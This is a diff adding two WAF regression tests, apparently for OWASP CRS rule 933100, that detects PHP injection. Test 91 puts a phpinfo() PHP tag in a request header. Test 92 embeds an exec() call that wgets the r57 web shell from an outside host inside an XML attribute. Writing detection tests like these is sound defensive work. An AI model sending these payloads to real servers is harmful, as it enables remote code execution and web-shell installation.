@@ -1653,3 +1653,38 @@ tests:
         output:
           log:
             no_expect_ids: [933100]
+  - test_id: 91
+    desc: |
+      PHP injection in HTTP header - CVE-2026-1540
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "*/*"
+            Host: "localhost"
+            User-Agent: "OWASP CRS test agent"
+            X-Forwarded-For: "<?=phpinfo()?>"
+          method: GET
+          port: 80
+          uri: "/profile"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [933100]
+  - test_id: 92
+    desc: 'GHSA: 933100 payload via XML attribute injection (verifies XML://@* coverage)'
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          method: POST
+          port: 80
+          headers:
+            User-Agent: 'OWASP CRS test agent'
+            Host: 'localhost'
+            Content-Type: 'application/xml'
+          uri: '/post'
+          data: '<?xml version="1.0"?><root><a probe="&lt;? exec(''wget http://r57.biz/r57.txt -O"></a></root>'
+          version: 'HTTP/1.1'
+        output:
+          log:
+            expect_ids: [933100]
